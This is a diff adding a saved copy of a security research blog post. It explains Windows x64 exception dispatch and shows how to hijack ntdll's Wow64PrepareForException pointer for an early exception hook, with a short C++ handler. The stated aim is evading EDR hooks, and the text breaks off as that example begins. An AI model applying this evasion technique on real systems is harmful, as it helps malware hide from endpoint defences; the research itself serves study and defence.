@@ -1,0 +1,577 @@
+# https://kr0tt.github.io/posts/early-exception-handling/
+
+<!DOCTYPE html><html lang="en"><body><div class="container center"><div class="content"><article class="post"><h1 class="post-title"><a href="https://kr0tt.github.io/posts/early-exception-handling/">Early Exception Handling</a></h1><div class="post-meta"><time class="post-date">2025-08-17&nbsp;[Updated 2025-08-17]</time><span class="post-reading-time">21 min read (4407 words)</span></div><div class="table-of-contents"><h2>Table of Contents</h2></div><div class="post-content"><div><h2 id="overview">Overview<a href="https://kr0tt.github.io/posts/early-exception-handling/#overview" class="hanchor" arialabel="Anchor">#</a></h2><p>Vectored Exception Handlers (VEH) have been used and abused by various communities and malware authors to intercept and manipulate program execution. More recently research papers and POCs using VEH, usually combined with hardware breakpoints, have surfaced in the offensive security community describing methods to capture exceptions to achieve whatever goals they aim to achieve (hooking functions, tampering syscalls, etc.). Different EDRs use VEH as well for their own purposes.</p><p>Although VEH are a powerful solution, adding a new VEH comes with a risk of detection as the <code>AddVectoredExceptionHandler</code> and <code>RtlAddVectoredExceptionHandler</code> functions might be hooked and adding a new handler might be monitored. To overcome this, <em>mannyfreddy</em>, <em>Joshua Magri</em> and others published work describing how to manipulate the existing VEH list to add your own custom handler to the list without relying on the <code>AddVectoredExceptionHandler</code> and <code>RtlAddVectoredExceptionHandler</code> functions. You should check <em>mannyfreddy</em>’s work <a href="https://mannyfreddy.gitbook.io/ya-boy-manny#fun-with-exception-handlers">here</a> and <em>Joshua Magri</em>’s <a href="https://www.ibm.com/think/x-force/using-veh-for-defense-evasion-process-injection">here</a>.</p><p>In this post I want to show how it is possible to insert our own exception handling logic without relying on VEH or SEH and to manipulate the exception handling long before VEH is called. I will be providing two simple, and obvious, examples on how we can implement this to achieve common offensive functionalities. If you wish, you can check out the code <a href="https://github.com/kr0tt/EarlyExceptionHandling">here</a>.</p><h2 id="what-happens-when-an-exception-occurs">What Happens When an Exception Occurs?<a href="https://kr0tt.github.io/posts/early-exception-handling/#what-happens-when-an-exception-occurs" class="hanchor" arialabel="Anchor">#</a></h2><p>To implement our early user-mode exception handler, we should first understand how exceptions in user-mode are handled by the CPU, transferred to a kernel-mode exception dispatcher and then returned to user-mode where they should be handled.</p><h3 id="cpu-interrupt-and-exception-mechanism">CPU Interrupt and Exception Mechanism<a href="https://kr0tt.github.io/posts/early-exception-handling/#cpu-interrupt-and-exception-mechanism" class="hanchor" arialabel="Anchor">#</a></h3><p>When a program performs an invalid operation, the CPU’s hardware interrupt and exception mechanism takes over. The purpose of the CPU’s hardware interrupt and exception mechanism is to transfer the appropriate exception or interrupt to the operating system’s kernel for dispatching.</p><p>To perform this, the CPU first gets the base address of the Interrupt Descriptor Table (IDT) from the IDTR register which gets populated with the IDT base address during the operating system initialization process. Next, the CPU uses the exception’s predefined vector number to access the exception’s entry in the IDT.</p><blockquote><p>The range for vector numbers in an Intel CPU is 0 to 255. The first 32 IDT entries (vectors 0–31) are reserved by the manufacturer for CPU exceptions while the rest are designated for user-defined exceptions and are mostly assigned to external devices.</p></blockquote><p>Each entry in the IDT on Windows x64 is represented by the <code>KIDTENTRY64</code> structure in the kernel.</p><div class="highlight"><div class="code-title">C++<button class="copy-button">Copy</button></div><div class="chroma"><table class="lntable"><tbody><tr><td class="lntd"><pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td><td class="lntd"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="c1">// https://www.vergiliusproject.com/kernels/x64/windows-10/22h2/_KIDTENTRY64
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">union</span> <span class="nc">_KIDTENTRY64</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">USHORT</span> <span class="n">OffsetLow</span><span class="p">;</span>                                                   <span class="c1">//0x0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">USHORT</span> <span class="n">Selector</span><span class="p">;</span>                                                    <span class="c1">//0x2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">USHORT</span> <span class="nl">IstIndex</span><span class="p">:</span><span class="mi">3</span><span class="p">;</span>                                                      <span class="c1">//0x4
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">USHORT</span> <span class="nl">Reserved0</span><span class="p">:</span><span class="mi">5</span><span class="p">;</span>                                                     <span class="c1">//0x4
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">USHORT</span> <span class="nl">Type</span><span class="p">:</span><span class="mi">5</span><span class="p">;</span>                                                          <span class="c1">//0x4
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">USHORT</span> <span class="nl">Dpl</span><span class="p">:</span><span class="mi">2</span><span class="p">;</span>                                                           <span class="c1">//0x4
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">struct</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">USHORT</span> <span class="nl">Present</span><span class="p">:</span><span class="mi">1</span><span class="p">;</span>                                                   <span class="c1">//0x4
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">USHORT</span> <span class="n">OffsetMiddle</span><span class="p">;</span>                                                <span class="c1">//0x6
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ULONG</span> <span class="n">OffsetHigh</span><span class="p">;</span>                                                   <span class="c1">//0x8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ULONG</span> <span class="n">Reserved1</span><span class="p">;</span>                                                    <span class="c1">//0xc
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONGLONG</span> <span class="n">Alignment</span><span class="p">;</span>                                                    <span class="c1">//0x0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span> 
+</span></span></code></pre></td></tr></tbody></table></div></div><p>For example, when an application will attempt to access a page set with <code>PAGE_GUARD</code>, the CPU will access the exception’s IDT entry by reading the IDTR register, which holds <code>0xffffa200573f6000</code> in the below screenshot, and will use the interrupt vector for the exception, which is vector 14 for page faults.</p><p></p><figure style="--img-max:900px;display:flex;flex-direction:column;align-items:center"><img src="https://kr0tt.github.io/images/Early-Exception-Hooking/idtr_kidtentry.jpg" alt="Reading the IDTR register" loading="lazy" style="display:block !important;margin:0 auto !important;height:auto !important;width:auto !important;max-width:min(100%,var(--img-max)) !important"></figure>In the above screenshot we can see the <code>OffsetHigh</code>, <code>OffsetMiddle</code> and <code>OffsetLow</code> fields are populated. The combination of these fields will result in the virtual address that the CPU will jump to when an interrupt occurs, which in our case is <code>nt!KiPageFaultShadow</code>.<p></p><p></p><figure style="--img-max:900px;display:flex;flex-direction:column;align-items:center"><img src="https://kr0tt.github.io/images/Early-Exception-Hooking/idtr_kidtentr_kernel_routine.jpg" alt="[idtr_kidtentr_kernel_routine.jpg]" loading="lazy" style="display:block !important;margin:0 auto !important;height:auto !important;width:auto !important;max-width:min(100%,var(--img-max)) !important"></figure><p></p><p><code>nt!KiPageFaultShadow</code> is an entry stub that will jump to the actual kernel handler for the exception <code>nt!KiPageFault</code>. This exists because of Kernel Virtual Address Shadow (KVA), which you can read more about <a href="https://wumb0.in/windows-10-kvas-and-software-smep.html">here</a> and <a href="https://msrc.microsoft.com/blog/2018/03/kva-shadow-mitigating-meltdown-on-windows/">here</a>.</p><p></p><figure style="--img-max:900px;display:flex;flex-direction:column;align-items:center"><img src="https://kr0tt.github.io/images/Early-Exception-Hooking/shadow_to_handler.jpg" alt="[shadow_to_handler.jpg]" loading="lazy" style="display:block !important;margin:0 auto !important;height:auto !important;width:auto !important;max-width:min(100%,var(--img-max)) !important"></figure><p></p><h3 id="kernel-mode-exception-handling-routine">Kernel-mode Exception Handling Routine<a href="https://kr0tt.github.io/posts/early-exception-handling/#kernel-mode-exception-handling-routine" class="hanchor" arialabel="Anchor">#</a></h3><p>Once execution has reached the kernel handler for the exception that was raised, the routine performs some checks, calls <code>nt!KiExceptionDispatch</code> which allocates an <code>ExceptionFrame</code> on the stack and saves the non-volatile registers. Then it fills an <code>ExceptionRecord</code> with information about the exception. After this <code>nt!KiDispatchException</code> is called. This function combines the <code>ExceptionFrame</code> and <code>TrapFrame</code> into a <code>ContextRecord</code>. It then calls <code>nt!KiPreprocessFault</code> which attempts to determine the cause of the fault or exception and will attempt to update the context record if required.</p><p>From here, <code>nt!KiDispatchException</code> attempts to identify if the exception happened in user-mode or kernel-mode and it will attempt to allow a user-mode or kernel-mode debugger to intervene and handle the exception.
+If the exception happened in kernel mode, <code>RtlDispatchException</code> will be called and will search for any exception handler that might be present. In case that there is no exception handler, or that that the handler failed to handle it, a call to <code>nt!KeBugCheckEx</code> will be performed.
+If the exception originated from user-mode, like in our example, the path that it will take will be different. <code>nt!KiDispatchException</code> will adjust the <code>TrapFrame</code> and it will load the address of <code>nt!KeUserExceptionDispatcher</code> to the instruction pointer.</p><p>If we take a look at the <code>nt!KeUserExceptionDispatcher</code>, we see that it actually points to <code>ntdll!KiUserExceptionDispatcher</code> which is the entry point of the user-mode exception handling routine. We will go over the <code>ntdll!KiUserExceptionDispatcher</code> function in the next section.</p><p></p><figure style="--img-max:900px;display:flex;flex-direction:column;align-items:center"><img src="https://kr0tt.github.io/images/Early-Exception-Hooking/2025-08-17_14-04-28.jpg" alt="[2025-08-17_14-04-28.jpg]" loading="lazy" style="display:block !important;margin:0 auto !important;height:auto !important;width:auto !important;max-width:min(100%,var(--img-max)) !important"></figure><p></p><p>At this stage we return back to <code>nt!KiExceptionDispatch</code> to close up the call, restore the volatile registers and to switch back to user mode using the <code>IRETQ</code> instruction. Because the instruction pointer now points to the address of <code>ntdll!KiUserExceptionDispatcher</code>, execution will resume from there.</p><h3 id="user-mode-exception-handling-routine">User-mode Exception Handling Routine<a href="https://kr0tt.github.io/posts/early-exception-handling/#user-mode-exception-handling-routine" class="hanchor" arialabel="Anchor">#</a></h3><p>We have now returned from kernel-mode back to user-mode and have landed in the
+<code>ntdll!KiUserExceptionDispatcher</code> function. This function takes two parameters, which the kernel passes on to it, a <code>CONTEXT</code> parameter and an <code>EXCEPTION_RECORD</code> parameter that contains information regarding the state of the user-mode application when the exception occurred. Using these parameters a handler will be able to identify the error code, the value of registers etc.</p><div class="highlight"><div class="code-title">C++<button class="copy-button">Copy</button></div><div class="chroma"><table class="lntable"><tbody><tr><td class="lntd"><pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td><td class="lntd"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// KiUserExceptionDispatcher psuedocode 
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">KiUserExceptionDispatcher</span><span class="p">(</span> <span class="n">PCONTEXT</span> <span class="n">ContextRecord</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">								<span class="n">PEXCEPTION_RECORD</span> <span class="n">ExceptionRecord</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span> <span class="n">Wow64PrepareForException</span> <span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="n">Wow64PrepareForException</span><span class="p">(</span><span class="n">ExceptionRecord</span><span class="p">,</span> <span class="n">ContextRecord</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">RtlDispatchException</span><span class="p">(</span><span class="n">ExceptionRecord</span><span class="p">,</span> <span class="n">ContextRecord</span><span class="p">)</span> <span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="n">RtlGuardRestoreContext</span><span class="p">(</span><span class="n">ContextRecord</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	    <span class="n">NTSTATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="n">ZwRaiseException</span><span class="p">(</span><span class="o">&amp;</span><span class="n">STACK</span><span class="p">[</span><span class="mh">0x4F0</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">retaddr</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">	<span class="n">RtlRaiseStatus</span><span class="p">(</span><span class="n">status</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></tbody></table></div></div><p>To find a handler for an exception, <code>ntdll!KiUserExceptionDispatcher</code> will call <code>ntdll!RtlDispatchException</code> which begins the search for an exception handler.</p><p>During this process the <code>ntdll!RtlpCallVectoredHandlers</code> function is called to check if there are any registered Vectored Exception Handlers by searching for entries in the <code>Exception Handler</code> list. If an entry exists in the Exception Handler list, <code>ntdll!RtlpCallVectoredHandlers</code> will begin calling each handler in the list until one of them returns the <code>EXCEPTION_CONTINUE_EXECUTION</code> status code. If a VEH is found and the exception is successfully handled, <code>ntdll!RtlpCallVectoredHandlers</code> will return back to <code>ntdll!RtlDispatchException</code> and signal any Vectored Continue Handler (VCH) in the Continue Handler list.</p><p>If no VEH is registered, <code>ntdll!RtlDispatchException</code> will begin with a Structured Exception Handling routine in which it will begin unwinding the call stack, perform a lookup of this unwind information and unwind until a handler that handles the exception is located.</p><h2 id="hooking-kiuserexceptiondispatcher">Hooking KiUserExceptionDispatcher<a href="https://kr0tt.github.io/posts/early-exception-handling/#hooking-kiuserexceptiondispatcher" class="hanchor" arialabel="Anchor">#</a></h2><p>In the previous section the pseudocode for <code>ntdll!KiUserExceptionDispatcher</code> was shown. In it, it was possible to spot a function call that was not covered just before the call to <code>ntdll!RtlDispatchException</code>, where the standard exception handling logic is implemented.</p><p></p><figure style="--img-max:900px;display:flex;flex-direction:column;align-items:center"><img src="https://kr0tt.github.io/images/Early-Exception-Hooking/prepareforexception_1.jpg" alt="[prepareforexception_1.jpg]" loading="lazy" style="display:block !important;margin:0 auto !important;height:auto !important;width:auto !important;max-width:min(100%,var(--img-max)) !important"></figure><p></p><p>In the above screenshot, we can see that once we land in <code>ntdll!KiUserExceptionDispatcher</code>, an attempt to read the value that is stored in <code>Wow64PrepareForException</code> into the <code>RAX</code> register is performed followed by a test to check if the value is null. If it is null, we jump to the previously discussed call to <code>ntdll!RtlDispatchException</code>. But if it is not null, a call to <code>Wow64PrepareForException</code> is performed.</p><p>If we take a closer look at <code>Wow64PrepareForException</code>, we can see that it is a pointer stored in the <code>.mrdata</code> section of <code>ntdll.dll</code>.</p><p></p><figure style="--img-max:900px;display:flex;flex-direction:column;align-items:center"><img src="https://kr0tt.github.io/images/Early-Exception-Hooking/prepareforexception_mrdata.jpg" alt="[prepareforexception_mrdata.jpg]" loading="lazy" style="display:block !important;margin:0 auto !important;height:auto !important;width:auto !important;max-width:min(100%,var(--img-max)) !important"></figure><p></p><p>Because we are running an 64-bit application on 64-bit Windows operating system <code>Wow64PrepareForException</code> will always be null. The reason behind this is because <code>Wow64PrepareForException</code> is a WOW64 callback function pointer and this function pointer only gets populated when we run a 32-bit application on a 64-bit Windows operating system.</p><h3 id="wow64--wow64-callbacks">WoW64 &amp; WoW64 Callbacks<a href="https://kr0tt.github.io/posts/early-exception-handling/#wow64--wow64-callbacks" class="hanchor" arialabel="Anchor">#</a></h3><p>Windows 32-bit on Windows 64-bit (WoW64) is a subsystem designed to enable 32-bit applications to run on a 64-bit Windows operating system by translating system calls and API calls between the 32-bit application and the 64-bit Windows kernel.</p><p>During the initialization process of a WoW64 application, <code>ntdll!LdrpLoadWow64</code> will load <code>wow64.dll</code> and resolve the address of exported <code>wow64.dll</code> functions. The function names and their pointers will be stored in an internal WoW64 callback table.</p><div class="highlight"><div class="code-title">C++<button class="copy-button">Copy</button></div><div class="chroma"><table class="lntable"><tbody><tr><td class="lntd"><pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td><td class="lntd"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// ntdll!LdrpLoadWow64 pseudocode
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="n">_int64</span> <span class="kr">__fastcall</span> <span class="nf">LdrpLoadWow64</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">LODWORD</span><span class="p">(</span><span class="n">v10</span><span class="p">)</span> <span class="o">=</span> <span class="mi">34078720</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v11</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">v15</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">RtlAppendUnicodeStringToString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v10</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">RtlAppendUnicodeToString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v10</span><span class="p">,</span> <span class="sa">L</span><span class="s">"wow64.dll"</span><span class="p">);</span> <span class="c1">// setting up the dll name
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">LdrpInitializeDllPath</span><span class="p">(</span><span class="n">v11</span><span class="p">,</span> <span class="mi">16385</span><span class="p">,</span> <span class="n">v13</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="n">LdrpLoadDll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v10</span><span class="p">,</span> <span class="n">v13</span><span class="p">,</span> <span class="mi">2048</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v12</span><span class="p">);</span>      <span class="c1">// loading wow64.dll
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ---- snip ----- //
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">LdrProtectMrdata</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// WoW64 Callback table
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">v3</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">off_18011DE30</span><span class="p">;</span> <span class="c1">// table of pairs containing function names &amp; pointers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                         
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">ProcedureAddressForCaller</span> <span class="o">=</span> <span class="n">LdrGetProcedureAddressForCaller</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">v12</span> <span class="o">+</span> <span class="mi">48</span><span class="p">),</span> <span class="o">*</span><span class="n">v3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">v3</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="n">retaddr</span><span class="p">);</span> <span class="c1">// resolve the exported functions
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span> <span class="n">ProcedureAddressForCaller</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">++</span><span class="n">v2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v3</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;=</span> <span class="mi">6</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></tbody></table></div></div><p></p><figure style="--img-max:900px;display:flex;flex-direction:column;align-items:center"><img src="https://kr0tt.github.io/images/Early-Exception-Hooking/array_of_wow64.jpg" alt="[array_of_wow64.jpg]" loading="lazy" style="display:block !important;margin:0 auto !important;height:auto !important;width:auto !important;max-width:min(100%,var(--img-max)) !important"></figure><p></p><p>Although on 64-bit we do not reach this stage and therefore <code>wow64.dll</code> is not loaded and the exported functions are not resolved, the WoW64 callback table is still present because it is a part of <code>ntdll.dll</code>.</p><h3 id="implementing-an-early-exception-hook--handler">Implementing an Early Exception Hook &amp; Handler<a href="https://kr0tt.github.io/posts/early-exception-handling/#implementing-an-early-exception-hook--handler" class="hanchor" arialabel="Anchor">#</a></h3><p>At this stage, it’s quite clear where we are going with this. We know that when an exception occurs it will find its way to <code>ntdll!KiUserExceptionDispatcher</code> where before going into the standard VEH/SEH dispatching and handling it will check if <code>Wow64PrepareForException</code> is not null, and if it isn’t, call whatever <code>Wow64PrepareForException</code> points to.</p><p>We can place our hook by writing the address of our own exception handler or the address of injected shellcode into the address field of <code>Wow64PrepareForException</code> in the WoW64 callback table. Another nice thing about all of this, apart from the fact that we are not creating or hijacking an existing VEH, is that the address of <code>Wow64PrepareForException</code> is not stored in the <code>.text</code> section, but in <code>.mrdata</code>. This will allow us to place the hook without overwriting existing code with our hook, an action that endpoint security tools tend to monitor for malicious activity.</p><p>There are multiple ways to cause an exception or fault: setting a <code>PAGE_GUARD</code> on a memory address and accessing it, dividing by zero, setting hardware breakpoints, injecting an <code>INT 3</code> instruction etc. By controlling where an exception will raise, we can hijack the natural flow of execution.</p><p>Once we have a preferred method for raising an exception, we will need a custom handler to handle the exception and perform the desired hooking operations. The example below displays an early exception handler that will set a hook by changing the <code>RIP</code> to some hooking function when a <code>STATUS_GUARD_PAGE_VIOLATION</code> exception is raised. It will then pass the <code>ContextRecord</code> to <code>ntdll!NtContinue</code> and call the function.</p><div class="highlight"><div class="code-title">C++<button class="copy-button">Copy</button></div><div class="chroma"><table class="lntable"><tbody><tr><td class="lntd"><pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td><td class="lntd"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="n">PVOID</span> <span class="nf">ExceptionHandler</span><span class="p">(</span><span class="n">PEXCEPTION_RECORD</span> <span class="n">exceptionRecord</span><span class="p">,</span> <span class="n">PCONTEXT</span> <span class="n">contextRecord</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">exceptionRecord</span><span class="o">-&gt;</span><span class="n">ExceptionCode</span> <span class="o">==</span> <span class="n">STATUS_GUARD_PAGE_VIOLATION</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">contextRecord</span><span class="o">-&gt;</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Hook</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">NtContinue</span><span class="p">(</span><span class="n">contextRecord</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></tbody></table></div></div><p>This exception handler is structured differently than the typical VEH. First, it takes a different set of parameters. While a VEH takes in a pointer to an <code>EXCEPTION_POINTERS</code> struct as parameter (<code>EXCEPTION_POINTERS</code> contains the <code>EXCEPTION_RECORD</code> and <code>CONTEXT</code> structures), the early exception handler must take in <code>EXCEPTION_RECORD</code> and <code>CONTEXT</code> separately. Second, because the exception handling logic relies only on the <code>ExceptionHandler</code> function, we must call <code>ntdll!NtContinue</code> within it to resume execution to our desired location.</p><p>Next, we will need to point <code>Wow64PrepareForException</code> to this exception handler. To do this, we will need to find the variable in the WoW64 callback table that holds the address for <code>Wow64PrepareForException</code> (remember, when running in 64-bit this function pointer will be null). We can either hardcode the offset to this function pointer in <code>ntdll.dll</code> or we can search for it dynamically. Luckily for us <em><a href="https://modexp.wordpress.com/">modexpblog</a></em> has released a <a href="https://gist.github.com/odzhan/b4898fa96f36b131973f62b797c4f639">POC</a> that shows how we can find the function pointers in the WoW64 callback table.</p><h2 id="examples">Examples<a href="https://kr0tt.github.io/posts/early-exception-handling/#examples" class="hanchor" arialabel="Anchor">#</a></h2><p>As promised in the overview section, the final two parts of this blog post will cover the usage of early exception handling to perform some common offensive functionalities. These are by no means novel or original (oh look, another way to avoid inline hooks…), I believe that they have been used previously, but I have not found any public examples or documentation for them.</p><h3 id="stepping-over-inline-hooks-using-kiuserexceptiondispatcher--wow64prepareforexception">Stepping Over Inline Hooks Using KiUserExceptionDispatcher &amp; Wow64PrepareForException<a href="https://kr0tt.github.io/posts/early-exception-handling/#stepping-over-inline-hooks-using-kiuserexceptiondispatcher--wow64prepareforexception" class="hanchor" arialabel="Anchor">#</a></h3><p>Some of the most used endpoint security products still hook various functions that are usually found in <code>kernel32.dll</code>, <code>kernelbase.dll</code> and <code>ntdll.dll</code>. These endpoint security products place hooks on functions that are prone to abuse (your allocation, memory permission modification, and thread creation primitives for example) by malware to detect if they are misused.</p><p>Throughout the years multiple techniques to avoid these hooks were introduced and improved: module unhooking, direct/indirect syscalls (and their hundreds of variations that accomplish the same goal) etc. We can use our early exception handler for this same purpose.</p><p>Before going into the actual implementation, let’s look at how a popular EDR hooks a sample function - <code>ntdll!NtAllocateVirtualMemory</code>.</p><p></p><figure 